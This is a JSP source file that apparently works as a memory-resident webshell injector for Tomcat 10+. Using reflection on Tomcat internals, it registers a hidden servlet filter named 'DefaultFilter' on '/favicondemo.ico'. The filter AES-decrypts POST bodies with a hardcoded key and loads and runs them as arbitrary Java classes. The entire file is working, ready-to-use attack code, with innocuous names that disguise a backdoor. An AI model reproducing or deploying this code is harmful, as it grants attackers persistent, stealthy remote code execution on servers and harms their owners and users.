<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>

<!-- tomcat 10+ -->
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>

<!-- jakarta namespace (Tomcat 10 / Jakarta EE 9+) -->
<%@ page import="jakarta.servlet.*" %>
<%@ page import="jakarta.servlet.http.HttpServletRequest" %>
<%@ page import="jakarta.servlet.http.HttpServletResponse" %>
<%@ page import="jakarta.servlet.http.HttpSession" %>
<%@ page import="javax.crypto.Cipher" %>
<%@ page import="javax.crypto.spec.SecretKeySpec" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.util.Base64" %>
<%@ page import="java.util.HashMap" %>
<%@ page import="java.util.Map" %>

<%!
class U extends ClassLoader {
    U(ClassLoader c) { super(c); }
    public Class g(byte[] b) { return super.defineClass(b, 0, b.length); }
}

class DefaultFilter implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {}

    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest) servletRequest;
        HttpServletResponse response = (HttpServletResponse) servletResponse;

        if (request.getMethod().equals("POST")) {
            try {
                String k = "42b842fc69195c9d";
                HttpSession session = request.getSession();
                session.setAttribute("u", k);

                Cipher c = Cipher.getInstance("AES");
                c.init(2, new SecretKeySpec(k.getBytes(), "AES"));

                Map<String, Object> pageContext = new HashMap<String, Object>();
                pageContext.put("session", session);
                pageContext.put("request", request);
                pageContext.put("response", response);
                new U(this.getClass().getClassLoader())
                    .g(c.doFinal(Base64.getDecoder().decode(request.getReader().readLine())))
                    .newInstance()
                    .equals(pageContext);
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else {
            filterChain.doFilter(servletRequest, servletResponse);
        }
    }

    public void destroy() {}
}
%>

<%
String name = "DefaultFilter";

ServletContext servletContext = request.getSession().getServletContext();

Field appctx = servletContext.getClass().getDeclaredField("context");
appctx.setAccessible(true);
ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
Field stdctx = applicationContext.getClass().getDeclaredField("context");
stdctx.setAccessible(true);
StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
Configs.setAccessible(true);
Map filterConfigs = (Map) Configs.get(standardContext);

if (filterConfigs.get(name) == null) {
    DefaultFilter filter = new DefaultFilter();

    FilterDef filterDef = new FilterDef();
    filterDef.setFilterName(name);
    filterDef.setFilterClass(filter.getClass().getName());
    filterDef.setFilter(filter);
    standardContext.addFilterDef(filterDef);

    FilterMap filterMap = new FilterMap();
    filterMap.addURLPattern("/favicondemo.ico");
    filterMap.setFilterName(name);
    filterMap.setDispatcher(DispatcherType.REQUEST.name());
    standardContext.addFilterMapBefore(filterMap);

    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
    constructor.setAccessible(true);
    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);

    filterConfigs.put(name, filterConfig);
    out.write("Inject success!");
} else {
    out.write("Injected");
}
%>
